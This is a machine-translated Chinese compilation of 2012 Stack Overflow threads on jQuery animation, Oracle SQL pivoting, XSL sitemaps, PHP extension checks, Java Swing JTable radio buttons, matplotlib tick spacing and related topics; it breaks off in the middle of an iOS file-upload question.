为什么要“从”sendTextMessage() 开始一个活动？为什么不直接发送短信，然后开始新的活动呢？

# jquery - 强制 jQuery 动画使用整数值

> ID：12078635
> 
> 赞同：4
> 
> 时间：2012-08-22T17:45:56.083
> 
> 标签：jquery, css, jquery-animate

有没有办法（牢记向前兼容性）强制 jQuery 动画在动画中只使用整数值？

我正在为元素的宽度设置动画。

```
<div style="width: 25px">...</div> 
```

我在检查器中查看动画时的元素，并且该值通常具有十进制的大量粒度。

```
<div style="width: 34.24002943013px">...</div> 
```

一旦达到目标，它只会“平静”到整数。

```
<div style="width: 50px">...</div> 
```

通常我不会为此烦恼，因为它显然是功能性的。

然而，在这个项目中，我必须始终保持像素完美，而且我担心使用分数像素宽度（或任何其他以像素测量的属性）会在浏览器之间呈现不一致。我知道`letter-spacing`一个[。](https://bugs.webkit.org/show_bug.cgi?id=20606)

有没有办法确保 jQuery 即使在动画中间也只使用无小数的值？

**编辑：**我觉得我应该澄清一下；我不只是使用`.animate({width:50})`. 我的大多数动画都是 jQuery UI 驱动`.hide()`的 s 和`.show()`s，我正在寻找的解决方案显然也应该适用于这些。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-06-08T13:41:25.153

对我来说，这以正确的方式工作：

```
$("div").animate({ width: 50}, {
    duration: 1000,
    step: function(now, fx){
        fx.now = parseInt(now);
    }
});​ 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-22T17:54:57.897

像这样的东西？

```
$("div").animate({ width: 50}, {
  duration: 1000,
  step: function(now, fx){

      var value = parseInt($(this).css("width"));

     $(this).css("width", value);
  }
});​ 
```

这样，在动画的每一“帧”中，宽度值都会被解析成一个整数值。

这样动画会变得不那么平滑，因为你正在削减一些值，但如果你的动画足够长，它甚至不会被注意到。

# sql - 是否有一条 SQL 语句可以将 2 个长列分成几对列？

> ID：12078637
> 
> 赞同：1
> 
> 时间：2012-08-22T17:46:02.267
> 
> 标签：sql, oracle, select, nested

我的数据在“正常”查询中会如下所示：

```
Val1    Val2
----    ----
1   2
2   [blank]
3   2
4
5   1
6   3
..
96  1 
```

不过，我想要的是这样的（我需要将行数限制为 12）：

```
Val1    Val2    Val1    Val2    Val1    Val2    ... Val1    Val2
----    ----    ----    ----    ----    ----
1   2   13  1   25  [blank]  ...    85  1
2   [blank] 14  1   26  3   ... 86  [blank]
..  ... ... ... ... ... ... ... ...
12  1   24  [blank] 36  2   ... 96  3 
```

是否有一个选择语句可以给我？我不是 SQL 专家，但我在想一些事情（语义上）沿着这些思路：

```
select (select val1, val2 from dbtable where val1 < 13),
(select val1, val2 from dbtable where val1 > 12 and val1 < 25),
...
(select val1, val2 from dbtable where val1 > 84)
from dbtable 
```

## 更新

响应 dfb 的 sql 示例：

当我这样做时：

```
SELECT t1.Val1, t1.Val2 FROM 
(SELECT Val1, Val2, rownum() as rownum FROM dbTable) t1 
INNER JOIN (SELECT Val1, Val2, rownum() as rownum FROM dbTable) t2 
ON t1.rownum/2 == t2.rownum/2 
```

...我得到*“未在预期的地方找到 FROM 关键字”*

当我这样做时（删除“rownum（）”的东西）：

```
SELECT t1.Val1, t1.Val2 FROM 
(SELECT Val1, Val2 FROM dbTable) t1 
INNER JOIN (SELECT Val1, Val2 FROM dbTable) t2 
ON t1.rownum/2 == t2.rownum/2 
```

...我收到*“ORA-01747：无效的 user.table.column、table.column 或列规范”*

## 更新 2

Sully 的例子是最接近的，虽然我希望 UNION SQL 能够工作——如果它可以在不压低有效值的情况下完成会更好。事实上，我有正确的布局，但 val 并没有出现在 16X12 布局中我需要它们的位置。无论如何，为了后代的缘故，下面是动态创建行和列的方式（不像下面的代码所示，并且彼此不完全相同）：

```
//prebuild 12 rows in outputDt 
int iRows = 12;
while (iRows > 0)
{
    DataRow row = outputDt.NewRow();
    outputDt.Rows.Add(row);
    iRows -= 1;
}

//prebuild 16 cols in outputDt 
int iCols = 16;
while (iCols > 0) {
    DataColumn col = new DataColumn();
    outputDt.Columns.Add(col);
    iCols -= 1;
} 
```

## 最后更新

得到它的工作。请参阅[是否可以使用交替的垂直列填充 DataGridView？](https://stackoverflow.com/questions/12065611/is-it-possible-to-populate-a-datagridview-with-alternating-vertical-columns)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:57:20.600

你可以这样做，但它并不漂亮。关于在表示层中执行此操作的评论是正确的。

```
SELECT ... FROM
(SELECT v1,v2,rownum as rn FROM Foo WHERE mod(rownum,2)=1) t1
INNER JOIN (SELECT v1,v2,rownum as rn FROM Foo WHERE mod(rownum,2)=0) t2
ON (t1.rn/2 = t2.rn/2) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T18:26:57.513

如果您知道行数将始终为 96，那么这是静态旋转技术之一

```
select val1 AS col1, val2 AS col2,NULL AS Col3,NULL AS Col4 ,NULL AS Col5,NULL AS Col6,NULL AS col7,NULL AS Col8 from dbtable where val1 < 13
UNION 
select NULL AS col1,NULL AS col2 ,val1 AS Col3, val2 AS Col4,NULL AS Col5,NULL AS Col6,NULL AS col7,NULL AS Col8 from dbtable where val1 > 12 and val1 < 25
UNION
select NULL AS col1,NULL AS col2 ,NULL AS Col3, NULL AS Col4,val1 AS Col5,val2 AS Col6,NULL AS col7,NULL AS Col8 from dbtable where val1 > 25 and val1 < 37
.....
...AND So ON 
```

如果行数未知，那么您需要进行动态透视。

注意：以上语法适用于 SQL Server 2008，我希望它不会与 Oracle 不同。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-22T18:27:17.403

这样做的好处是，如果您最终获得更多数据，它只会根据需要构建更多水平列，但永远不会超过 12 行数据。如果您需要显示更多数据，“in-SQL”方式将需要更改代码。

**免责声明**：这完全是即兴的（C#，因为那是我习惯的）。可能有更好的方法可以做到这一点（Linq？）逻辑应该非常接近，但这使您可以灵活地将该数据列表用于其他目的，而不是这个非常狭窄的显示。

```
DataTable dt = ResultsFromSproc();
DataTable outputDt = new DataTable();

//prebuild 12 rows in outputDt
int iRows = 12;
while(iRows > 0) {
    outputDt.Rows.Add(new DataRow());
    iRows-=1;
}

int outputColumn = 0;
for(int i = 0; i < dt.Rows.Count; i+=1){
    DataRow dr = dt.Rows[i];

    if(i % 12 == 0 && i > 0) { 
        //add two more columns to outputDt
        outputDt.Columns.Add() //Not sure but you might need to give it a name. (outputColumn+2).ToString() should work
        outputDt.Columns.Add() //Not sure but you might need to give it a name. (outputColumn+3).ToString() should work
        outputColumn += 1;
    }
    outputDt.Rows[i%12][outputColumn] = dr[0];
    outputDt.Rows[i%12][outputColumn + 1] = dr[1];
}
//Step2: Bind to outputDt. Step 3: Profit! 
```

**替代版本**：对于 val1 == 48 进入单元格 48 的要求（见评论）

```
DataTable dt = ResultsFromSproc();
DataTable outputDt = new DataTable();

//prebuild 12 rows in outputDt
int iRows = 12;
while(iRows > 0) {
    outputDt.Rows.Add(new DataRow());
    iRows-=1;
}

int outputColumn = 0;
int iMaxCell = (int)dt.Select("MAX(Val1)")[0][0];
//ASSUMING YOU HAVE ALREADY DONE AN ORDER BY Val1 in SQL (if not you need to sort it here first)
for(int i = 0; i < iMaxCell; i+=1){
    DataRow dr = dt.Rows[i];

    if(i % 12 == 0 && i > 0) { 
        //add two more columns to outputDt
        outputDt.Columns.Add() //Not sure but you might need to give it a name. (outputColumn+2).ToString() should work
        outputDt.Columns.Add() //Not sure but you might need to give it a name. (outputColumn+3).ToString() should work
        outputColumn += 2;
    }
    //compare to i+1 if your data starts at 1
    if((int)dr[0] == (i+1)){
        outputDt.Rows[i%12][outputColumn] = dr[0];
        outputDt.Rows[i%12][outputColumn + 1] = dr[1];
    }
}
//Step2: Bind to outputDt. Step 3: Profit! 
```

# xml - 站点地图 xml 和 xsl 的问题 - 未找到文档类型且语法不正确

> ID：12078640
> 
> 赞同：0
> 
> 时间：2012-08-22T17:46:10.637
> 
> 标签：xml, xslt, syntax, sitemap, doctype

我有一个 xml 格式的站点地图，它给我一个错误“找不到文档类型”。也许源代码有问题，我希望有人帮助我纠正语法。我是 xml/xsl 语法的新手，所以即使站点地图有效，我也不知道要验证我的站点地图，因为我总是找不到文档类型……我使用复制指令将 html 输出放到浏览器中文档类型...

如果我尝试使用输出 xml，我只会看到纯文本而不是 html，并且缺少 doctype...请帮助我使用语法...请更正我的文件...请帮助我！

站点地图.xml：

```
 <?xml version="1.0" encoding="utf-8"?>
  <?xml-stylesheet href="sitemap.xsl" type="text/xsl"?>
  <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
    <url>
      <loc>http://www.alecos.it/games.php</loc>
      <changefreq>daily</changefreq>
      <priority>1.0</priority>
    </url>
    <url>
      <loc>http://www.alecos.it/diary_31032007.php</loc>
      <changefreq>daily</changefreq>
      <priority>1.0</priority>
    </url>
    cut... cut...
  </urlset> 
```

站点地图.xsl：

```
 <xsl:stylesheet version="2.0"
    xmlns:html="http://www.w3.org/TR/REC-html40"
    xmlns:sitemap="http://www.sitemaps.org/schemas/sitemap/0.9"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="html" omit-xml-declaration="yes" indent="yes"
    doctype-system="http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"
    doctype-public="-//W3C//DTD XHTML 1.0 Transitional//EN"/>
  <xsl:template match="/">
  <html>
  <head>
    <title>SiteMap - Alecos Web Site By Alessandro Marinuzzi</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
  </head>
  <body>
  <div id="content">
  <h1><a href="index.php" title="Alecos Web Site"><img src="gfx/Logo.png" alt="[Alecos WebSite SiteMap]" border="0"/></a></h1>
  <div class="intro">
    <p>Generated By <a href="http://www.alecos.it/">www.alecos.it</a>. Windows, Linux, Unix, MacOS(X) and Amiga programs, scripts, translations, articles and more...</p>
    <p>This sitemap contains <xsl:value-of select="count(sitemap:urlset/sitemap:url)"/> URLs.</p>
  </div>
  <table class="sitemap" cellpadding="3">
    <thead>
      <tr>
        <th width="80%">URL</th>
        <th width="10%">Priority</th>
        <th width="10%">Change Frequency</th>
      </tr>
    </thead>
    <tbody>
      <xsl:variable name="lower" select="'abcdefghijklmnopqrstuvwxyz'"/>
      <xsl:variable name="upper" select="'ABCDEFGHIJKLMNOPQRSTUVWXYZ'"/>
      <xsl:for-each select="sitemap:urlset/sitemap:url">
        <tr>
          <td>
            <xsl:variable name="itemURL">
              <xsl:value-of select="sitemap:loc"/>
            </xsl:variable>
            <a href="{$itemURL}">
              <xsl:value-of select="sitemap:loc"/>
            </a>
          </td>
          <td>
            <xsl:value-of select="concat(sitemap:priority*100,'%')"/>
          </td>
          <td>
            <xsl:value-of select="concat(translate(substring(sitemap:changefreq, 1, 1),concat($lower, $upper),concat($upper, $lower)),substring(sitemap:changefreq, 2))"/>
          </td>
        </tr>
      </xsl:for-each>
    </tbody>
  </table>
  </div>
  </body>
  </html>
  </xsl:template>
  <xsl:copy>
  <xsl:apply-templates select="/"/>
  </xsl:copy>
  </xsl:stylesheet> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-23T10:38:50.787

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:html="http://www.w3.org/TR/REC-html40" xmlns:image="http://www.google.com/schemas/sitemap-image/1.1" xmlns:sitemap="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns="http://www.w3.org/1999/xhtml">
<head>
  <title>SiteMap - Alecos Web Site By Alessandro Marinuzzi</title>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  cut... cut... 
```

这是我的代码会产生的，看起来很不错！不是吗？现在我需要确认我现在是正确的！谢谢！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-23T10:26:06.330

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="2.0"
  xmlns:html="http://www.w3.org/TR/REC-html40"
  xmlns:image="http://www.google.com/schemas/sitemap-image/1.1"
  xmlns:sitemap="http://www.sitemaps.org/schemas/sitemap/0.9"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns="http://www.w3.org/1999/xhtml">
<xsl:output
  omit-xml-declaration="no" method="xml"
  doctype-public="-//W3C//DTD XHTML 1.0 Strict//EN"
  doctype-system="http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"
  indent="yes" encoding="UTF-8"/>
<xsl:template match="/">
<html>
<head>
<title>SiteMap - Alecos Web Site By Alessandro Marinuzzi</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<style type="text/css">
body {
  font-family: Helvetica, Arial, sans-serif;
  font-size: 68.5%;
  color: #333;
}
table {
  border: none;
  border-collapse: collapse;
}
.sitemap tr.odd {
  background-color: #f7f7f7;
}
.sitemap tbody tr:hover {
  background-color: #ddf4df;
}
.sitemap tbody tr:hover td, .sitemap tbody tr:hover td a {
  color: #060;
}
a {
  color: #000;
  text-decoration: none;
}
.intro p {
  color: #060;
}
a:hover {
  text-decoration: underline;
  color: #690;
}
table {
  font-size: 1em;
  width: 100%;
}
th {
  text-align: left;
  padding: 5px;
}
thead th {
  background-color: #ccffcc;
  border-bottom: 1px solid #99cc99;
  border-top: 1px solid #99cc99;
}
tbody tr {
  border-bottom: 1px dotted #CCC;
  padding: 5px 0;
}
</style>
</head>
<body>
<div id="content">
<h1><a href="index.php" title="Alecos Web Site"><img src="gfx/Logo.png" alt="[Alecos WebSite SiteMap]" border="0"/></a></h1>
<div class="intro">
  <p>Generated By <a href="http://www.alecos.it/">www.alecos.it</a>. Windows, Linux, Unix, MacOS(X) and Amiga programs, scripts, translations, articles and more...</p>
  <p>This sitemap contains <xsl:value-of select="count(sitemap:urlset/sitemap:url)"/> URLs.</p>
</div>
<table class="sitemap" cellpadding="3">
  <thead>
    <tr>
      <th width="80%">URL</th>
      <th width="10%">Priority</th>
      <th width="10%">Change Frequency</th>
    </tr>
  </thead>
  <tbody>
    <xsl:variable name="lower" select="'abcdefghijklmnopqrstuvwxyz'"/>
    <xsl:variable name="upper" select="'ABCDEFGHIJKLMNOPQRSTUVWXYZ'"/>
    <xsl:for-each select="sitemap:urlset/sitemap:url">
      <tr>
        <td>
          <xsl:variable name="itemURL">
            <xsl:value-of select="sitemap:loc"/>
          </xsl:variable>
          <a href="{$itemURL}">
            <xsl:value-of select="sitemap:loc"/>
          </a>
        </td>
        <td>
          <xsl:value-of select="concat(sitemap:priority*100,'%')"/>
        </td>
        <td>
          <xsl:value-of select="concat(translate(substring(sitemap:changefreq, 1, 1),concat($lower, $upper),concat($upper, $lower)),substring(sitemap:changefreq, 2))"/>
        </td>
      </tr>
    </xsl:for-each>
  </tbody>
</table>
</div>
</body>
</html>
</xsl:template>
</xsl:stylesheet> 
```

这适用于 doctype 声明，并且没有发现任何错误！我在这里为其他有同样问题的用户发帖。这是我的 sitemap.xsl 的最终版本。随心所欲地分享和使用！

# html - 严重的 404，批量重定向

> ID：12078641
> 
> 赞同：1
> 
> 时间：2012-08-22T17:46:15.107
> 
> 标签：html, web, http-status-code-404, http-status-code-301

我有一点情况要来了。由于一个完整的网站结构重新设计基本上是不可能的，我希望我们的站点地图大约 12,000 个 url 有大约 90-95% 的变化。在这 12,000 个中，我预计大约有 5000-6000 个内部链接会在此过程中失效。由于该站点仍在开发中，因此尚无指向该站点的外部链接。

有没有一种工具可以在重组后提供 sitemap.xml 并让它解析每个页面的 404 错误，并且只报告页面/错误？

我找到了一些工具，但似乎都限制在 100 页以内。

对中级网站管理员有什么建议可以帮助解决这种情况吗？在这种情况下，301 重定向是不可行的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:58:46.950

根据您在编程方面的经验，这样做应该不难（解析 sitemap.xml，查找所有链接，向每个链接发出 http 请求，保存状态代码）。

如果您正在寻找专门的工具，我会说您可以尝试 wget（向其提供站点地图 URL，请参阅此处了解详细信息：[http ://www.wezm.net/technical/2009/05/spider-a-site- with-wget-using-sitemap-xml/](http://www.wezm.net/technical/2009/05/spider-a-site-with-wget-using-sitemap-xml/) ), 或[HTTrack](http://www.httrack.com/)

# actionscript-3 - 黑客窃取/反编译时间线上的代码是更容易还是更难？

> ID：12078642
> 
> 赞同：1
> 
> 时间：2012-08-22T17:46:17.613
> 
> 标签：actionscript-3, flash, timeline, decompiling

谁能告诉我时间线上的代码是更难还是更容易窃取/反编译？还是一切都一样？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:56:35.140

没有真正的区别。专门的程序员总是可以对您的 ActionScript 进行逆向工程。请记住，可以使用的不仅仅是像 Sothink 这样的 3rd 方应用程序。甚至 Adob​​e 也有“检查” swf 的工具：http: [//labs.adobe.com/technologies/swfinvestigator/](http://labs.adobe.com/technologies/swfinvestigator/)。

如果您的代码真的特别到足以保证窃取，那么您可能想要使用 Flash 以外的平台（或者将您的敏感代码放入外部 C/C++ 程序集并使用类似[Alchemy](http://labs.adobe.com/technologies/alchemy/)的工具运行）。

但是，您真的在做一些如此独特的事情，以至于人们会试图窃取它吗？是不是很特别，他们无法弄清楚你做了什么并复制它？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T18:31:14.853

差异基本上为零。在 AS3 中，时间线代码无论如何都会在类中结束。主时间线的代码将出现在`*filename*_fla.MainTimeline`. Symbol1 的代码将出现在 中`*filename*_fla.Symbol1`，依此类推。

时间线代码可以稍微容易理解，因为未显式声明为局部变量的变量将成为类变量。类变量的名称保存在 SWF 中，而局部变量则没有。

如果您对代码如何存储在 SWF 中感到好奇，请查看我的[在线 ActionScript 反汇编程序。](http://flaczki.net46.net/codedump/)

# c# - 是因为一个需求而引入数据传输对象模式还是将代码放在业务对象中？

> ID：12078645
> 
> 赞同：0
> 
> 时间：2012-08-22T17:46:26.510
> 
> 标签：c#, business-objects, dto

我有 3 个实体，它们以这种方式相互关联：

```
1 Release has N Testplan
1 Template has N Testplan 
```

为了创建一个测试计划，我需要从可用版本和模板列表中进行选择，因此我创建了这个 DTO：

```
public class TestplanDTO
{
        public IEnumerable<Template> Templates { get; set; }
        public IEnumerable<Release> Releases { get; set; }
} 
```

如果我将此代码放在 Testplan 业务对象中对我来说似乎是错误的，因为测试计划没有多个模板或版本。

我现在问自己，我是否真的应该为这种情况引入 DTO 模式，或者您认为将该代码放在 Testplan BO 中如何？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T17:52:40.307

不应该是

```
public class TestplanDTO
{
    public TemplateDTO Template { get; set; }
    public ReleaseDTO Release { get; set; }
} 
```

?

您的 DTO 课程表明 1 个测试计划有 N 个 Teplates，1 个测试计划有 N 个版本，这与您在开始时提出的相反。

如果没有更广泛的背景，问题的另一部分（您是否真的应该引入 DTO 模式）无法回答。

**编辑**

我想我开始明白了。如果您需要显示可用模板和版本的列表，那么是的，您可以拥有它

```
public class TestplanDTO
{
    public TemplateDTO Template { get; set; }
    public ReleaseDTO Release { get; set; }

    public IEnumerable<TemplateDTO> AvailableTemplates { get; }
    public IEnumerable<ReleaseDTO> AvailableReleases { get; }
} 
```

# python - Matplotlib - 如何设置 xticks 之间的距离（以 mm/cm/points 为单位...）

> ID：12078646
> 
> 赞同：6
> 
> 时间：2012-08-22T17:46:28.937
> 
> 标签：python, matplotlib

我在网上找了很长时间，但不知道怎么做。我需要绘制几个 xticks 定义为 numpy.arange(1,N) 的图形，每个图形的 N 都不同。我希望 xticks 之间的间距在所有图形上都相同（例如 1 厘米），也就是说，每个图形的宽度必须取决于 numpy.arange(1,N) 的大小。知道怎么做吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T18:46:10.177

我认为您可以通过仔细控制轴大小（作为图形的一部分）`ax.set_xlim`和`fig.set_size_inches` [（doc）](http://matplotlib.sourceforge.net/api/figure_api.html#matplotlib.figure.Figure.set_size_inches)来设置图形的实际大小来做到这一点。

前任

```
 fig = plt.figure()
 ax = fig.add_axes([0,0,1,1])
 ax.set_xlim([0,N])
 fig.set_size_inches([N/2.54,h]) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-07-30T14:12:53.100

为了扩展@tcaswell 的答案，当我想对轴的真实尺寸和刻度间距离的实际尺寸进行微观管理时，我就是这样做的。

```
import numpy as np
import matplotlib.pyplot as plt

plt.close('all')

#------------------------------------------------------ define xticks setup ----

xticks_pos = np.arange(11) # xticks  relative position in xaxis
N = np.max(xticks_pos) - np.min(xticks_pos) # numbers of space between ticks
dx = 1 / 2.54 # fixed space between xticks in inches
xaxis_length = N * dx

#------------------------------------------------------------ create figure ----

#---- define margins size in inches ----

left_margin  = 0.5
right_margin = 0.2
bottom_margin = 0.5
top_margin = 0.25

#--- calculate total figure size in inches ----

fwidth = left_margin + right_margin + xaxis_length
fheight = 3

fig = plt.figure(figsize=(fwidth, fheight))
fig.patch.set_facecolor('white')

#---------------------------------------------------------------- create axe----

#---- axes relative size ----

axw = 1 - (left_margin + right_margin) / fwidth
axh = 1 - (bottom_margin + top_margin) / fheight

x0 = left_margin / fwidth
y0 = bottom_margin / fheight

ax0 = fig.add_axes([x0, y0, axw, axh], frameon=True)

#---------------------------------------------------------------- set xticks----

ax0.set_xticks(xticks_pos)

plt.show(block=False)
fig.savefig('axis_ticks_cm.png') 
```

这导致一个 11.8 厘米的图形，x 轴为 10 厘米，每个刻度之间有 1 厘米的空间：

[![在此处输入图像描述](../Images/9020cc5190bde52b6ad84ef685947329.png)](https://i.stack.imgur.com/Omt90.png)

# php - 图片 url 无法通过 if 语句

> ID：12078647
> 
> 赞同：1
> 
> 时间：2012-08-22T17:46:36.737
> 
> 标签：php, pathinfo

我将图像 url 发布到 php 脚本。在这个 php 脚本中，我获取图像 url 并检查扩展名是什么，以及此扩展名是否与几个扩展名匹配：

```
 $ext1 = pathinfo($_POST['form_pic'], PATHINFO_EXTENSION);
        $ext = strtolower($ext1);

        if($ext != 'jpg' || $ext != 'jpeg' || $ext != 'png' || $ext != 'gif') {
            echo $ext; echo "wrong";        
        }else{
            echo "a correct extension";
        } 
```

但即使我发布了一个类似的网址：[http](http://www.test.com/picture.jpg) ://www.test.com/picture.jpg并且他得到了扩展名，在这种情况下是 jpg，他仍然通过 if 语句，说扩展名不等于if 语句中提到的一个。

我不知道我做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T17:48:03.437

你想`and`在这个逻辑中使用，而不是`or`.

```
if($ext != 'jpg' && $ext != 'jpeg' && $ext != 'png' && $ext != 'gif') 
```

目前，您的`if`声明为“如果扩展名不是 jpg 或不是 png 或不是 gif”，即使允许扩展名（即“jpg”），它也将始终匹配，因为“jpg”！=“ .png”。

您想要`and`，因为它会使`if`声明显示为“如果扩展名不是 jpg 且不是 png 且不是 gif”，那么它是无效的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T17:49:24.863

你也可以做

```
if(in_array($ext,array('gif','jpg','jpeg','png')){
//good
}else{
//bad
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T17:48:21.320

尝试切换逻辑：

```
if($ext == 'jpg' || $ext == 'jpeg' || $ext == 'png' || $ext == 'gif') {
    echo "a correct extension";
}else{
    echo $ext; echo "wrong";        
} 
```

使用 OR，如果满足任何条件，就会触发条件，并且由于 .jpg 扩展名与 .png 扩展名不匹配，它会给您`Wrong`消息。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-22T17:48:46.440

您的代码几乎是正确的，但`&&`在这种情况下您必须使用正确的运算符。

请试试这个：

```
$ext1 = pathinfo($_POST['form_pic'], PATHINFO_EXTENSION);
$ext = strtolower($ext1);

   if($ext != 'jpg' && $ext != 'jpeg' && $ext != 'png' && $ext != 'gif') {
        echo $ext; echo "wrong";        
   } else {
        echo "A correct extension";
   } 
```

当您使用一系列否定语句时，总是应该使用 operator `&&`。

有很多方法可以做你想做的事，但如果你想保留你的代码，因为它只是改变`||`，`&&`你会没事的。

请阅读有关PHP 中的[逻辑运算符的更多信息。](http://php.net/manual/en/language.operators.logical.php)

# java - 在 JTable 中设置默认启用的单选按钮

> ID：12078648
> 
> 赞同：1
> 
> 时间：2012-08-22T17:46:42.743
> 
> 标签：java, swing, jtable, jradiobutton, buttongroup

我使用[本](http://www.java2s.com/Code/Java/Swing-Components/RadioButtonTableExample.htm)指南是为了让它`JTable`处理单选按钮。工作正常，除了我需要启用默认启用按钮。

可以有 n 行。我试图通过默认的表格模型启用它`Object[][]`，表格，我尝试在将按钮添加到之前启用它`Object[][]`。我不知道如何（如果可能的话）使用按钮组来做到这一点。

要找到默认启用的按钮，我必须将按钮文本与字符串进行比较（这部分有效）。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-22T18:13:01.547

不确定我是否正确解释了这个问题。您可以使用`JRadioButton`构造函数来设置选择，例如片段（基于 OP 代码示例）将设置选定按钮“B”：

```
dm.setDataVector(new Object[][] { { "Group 1", new JRadioButton("A") },
    { "Group 1", new JRadioButton("B", true) },
    { "Group 1", new JRadioButton("C") },
    { "Group 2", new JRadioButton("a") },
    { "Group 2", new JRadioButton("b") } }, new Object[] {
    "String", "JRadioButton" }); 
```

您还可以像这样更改选择：

```
((JRadioButton) dm.getValueAt(0, 1)).setSelected(true); 
```

也可以使用`ButtonGroup.setSelected()`方法。

***编辑：从模型中消除组件***

模型应该包含数据而不是组件。在模型中存储组件违背了渲染器和编辑器的想法。有关更多详细信息，请参阅[编辑器和渲染器](http://docs.oracle.com/javase/tutorial/uiswing/components/table.html#editrender)以及[Swing 模型和渲染器](http://java.sun.com/docs/books/performance/1st_edition/html/JPSwingModels.fm.html)。查看以下示例，该示例模拟了模型中的按钮组行为：

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;
import javax.swing.border.*;
import javax.swing.plaf.*;
import javax.swing.table.*;

public class ButtonGroupMockupTest {
    private static void createAndShowGUI() {
        DefaultTableModel model = new DefaultTableModel(new Object[][] {
                { "Group 1", Boolean.FALSE }, { "Group 2", Boolean.FALSE },
                { "Group 3", Boolean.FALSE } },
                new Object[] { "Name", "State" }) {

            private static final long serialVersionUID = 1L;

            @Override
            public Class getColumnClass(int col) {
                if (col == 1)
                    return Boolean.class;
                return super.getColumnClass(col);
            }

            @Override
            public void setValueAt(Object value, int row, int col) {
                super.setValueAt(value, row, col);
                if (col == 1 && value.equals(Boolean.TRUE))
                    deselectValues(row, col);
            }

            private void deselectValues(int selectedRow, int col) {
                for (int row = 0; row < getRowCount(); row++) {
                    if (getValueAt(row, col).equals(Boolean.TRUE)
                            && row != selectedRow) {
                        setValueAt(Boolean.FALSE, row, col);
                        fireTableCellUpdated(row, col);
                    }
                }
            }
        };

        JTable table = new JTable(model);
        table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        table.setDefaultRenderer(Boolean.class, new BooleanRadionRenderer());
        table.setDefaultEditor(Boolean.class, new BooleanRadioEditor());

        JFrame f = new JFrame();
        f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        f.add(new JScrollPane(table));

        f.pack();
        f.setLocationByPlatform(true);
        f.setVisible(true);
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                createAndShowGUI();
            }
        });
    }

    static class BooleanRadionRenderer implements TableCellRenderer, UIResource {
        JRadioButton radioButton;
        Border emptyBorder;

        public BooleanRadionRenderer() {
            radioButton = new JRadioButton();
            radioButton.setHorizontalAlignment(JRadioButton.CENTER);
            radioButton.setBorderPainted(true);
            emptyBorder = BorderFactory.createEmptyBorder(1, 1, 1, 1);
        }

        @Override
        public Component getTableCellRendererComponent(JTable table, Object value,
                boolean isSelected, boolean hasFocus, int row, int col) {
            if (isSelected) {
                radioButton.setBackground(table.getSelectionBackground());
                radioButton.setForeground(table.getSelectionForeground());
            } else {
                radioButton.setBackground(table.getBackground());
                radioButton.setForeground(table.getForeground());
            }
            if (hasFocus)
                radioButton.setBorder(UIManager
                        .getBorder("Table.focusCellHighlightBorder"));
            else
                radioButton.setBorder(emptyBorder);

            radioButton.setSelected(((Boolean) value).booleanValue());
            return radioButton;
        }
    }

    static class BooleanRadioEditor extends AbstractCellEditor 
                                    implements TableCellEditor {
        private static final long serialVersionUID = 1L;
        private JRadioButton radioButton;

        public BooleanRadioEditor() {
            radioButton = new JRadioButton();
            radioButton.setHorizontalAlignment(JRadioButton.CENTER);
            radioButton.addActionListener(new ActionListener() {
                public void actionPerformed(ActionEvent e) {
                    // prevent deselection to mimic button group
                    if (!radioButton.isSelected())
                        cancelCellEditing();
                    stopCellEditing();
                }
            });
        }

        @Override
        public Component getTableCellEditorComponent(JTable table, Object value,
                boolean isSelected, int row, int col) {
            radioButton.setSelected(((Boolean) value).booleanValue());
            return radioButton;
        }

        @Override
        public Object getCellEditorValue() {
            return Boolean.valueOf(radioButton.isSelected());
        }
    }   
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T18:12:23.020

您是否尝试重新绘制（）您的 JTable ？

该复选框是始终未选中还是在某些情况下未选中？

Hovercraft Full Of Eels 是对的：你能发布一堆你的代码吗？

# ios - 如何上传在 iPad 中创建的文件？

> ID：12078652
> 
> 赞同：0
> 
> 时间：2012-08-22T17:46:50.113
> 
> 标签：ios, file-upload

我正在尝试继续一个项目，但也许我向谷歌提出了错误的问题。

我一直在使用 NSURLConnection 下载文件

```
NSURLRequest * XMLRequested = [[NSURLRequest alloc] initWithURL:[NSURL URLWithString:@"http://kilkadg.com/cursos/images/imagenes.xml"]];

NSURLConnection * conexion = [[NSURLConnection alloc] initWithRequest:XMLRequested delegate:self]; 
```

并实现下一个方法

```
